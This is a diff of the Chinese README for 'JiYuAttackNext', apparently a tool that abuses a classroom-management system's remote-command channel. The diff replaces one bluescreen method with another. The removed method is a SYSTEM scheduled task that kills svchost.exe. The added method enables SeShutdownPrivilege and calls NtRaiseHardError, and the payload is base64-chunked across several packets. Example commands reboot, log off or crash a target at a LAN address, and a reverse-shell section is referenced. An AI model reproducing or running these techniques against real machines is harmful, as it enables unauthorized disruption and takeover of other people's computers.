@@ -199,16 +199,15 @@ start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 | `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
 | `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
 | `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
-| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令结束 `svchost.exe`（以 SYSTEM 计划任务执行） |
+| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令启用关机特权并调用 `NtRaiseHardError` |
 
-debug 版本会在发送前写一条 `DEBUG` 日志“蓝屏触发时间”，给出按本机时钟推算的触发时刻与报文条数；触发时间实际由目标机的时钟计算，两边不同步时以目标机为准。
+debug 版本会在发送前写一条 `DEBUG` 日志“蓝屏载荷”，给出载荷做法与报文条数。
 
-四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏是一段用 `schtasks` 以 SYSTEM 身份结束 `svchost.exe` 的脚本，按命令通道上限拆成五条依次下发。
+四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏是一段启用关机特权后调用内核硬错误接口的脚本，按命令通道上限拆成七条依次下发。
 
-蓝屏的原理是结束系统关键进程 `svchost.exe`：命令通道本身不是管理员身份，所以脚本先用
-`schtasks /Create ... /RL HIGHEST /RU "NT AUTHORITY\SYSTEM" /TR "cmd /c taskkill /f /im svchost.exe"`
-建一个一次性计划任务，再 `schtasks /Run` 立即以 SYSTEM 权限执行，进程终止后系统判定关键进程丢失并进入蓝屏。任务名固定为 `SvcHostDiag`，触发时间取目标本机时间加 15 秒（`(Get-Date).AddSeconds(15)`，按 `MM/dd/yyyy` 与 `HH:mm` 书写），只执行一次，所以脚本连发的 `schtasks /Run` 会立刻跑起来，不需要等到这个时间点，也不会自己重复运行；需要清理时在目标上执行 `schtasks /Delete /TN SvcHostDiag /F`。
-单条远程命令最多 163 个 UTF-16 单元，脚本装不下，所以先转成 base64 按 90 字符分片写进目标的临时文件，最后一条命令解码执行，共五条报文，目标允许执行远程命令时才会生效。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
+蓝屏的原理是让内核按硬错误停机：命令通道只有目标上的普通用户令牌，但 `SeShutdownPrivilege`（关闭系统）在工作站默认授予 `Users`，只是默认禁用，脚本先用 `RtlAdjustPrivilege(19, 1, 0, ...)` 在自己的进程里启用它，再调用
+`NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ...)`（响应选项 6 表示关机），系统随即按这个状态码蓝屏并重启。整个过程不需要管理员、不需要计划任务，也不结束任何进程，因此比结束 `svchost.exe` 稳。
+单条远程命令最多 163 个 UTF-16 单元，脚本装不下，所以先转成 base64 按 90 字符分片写进目标的临时文件，最后一条命令解码执行，共七条报文，目标允许执行远程命令时才会生效。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
 
 ### remote shell（反弹终端）
 
@@ -438,7 +437,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 # 注销目标当前登录用户
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
 
-# 触发目标蓝屏（以 SYSTEM 计划任务结束 svchost.exe，机器随后重启）
+# 触发目标蓝屏（启用关机特权后调用 NtRaiseHardError，机器随后重启）
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --bluescreen
 ```
 
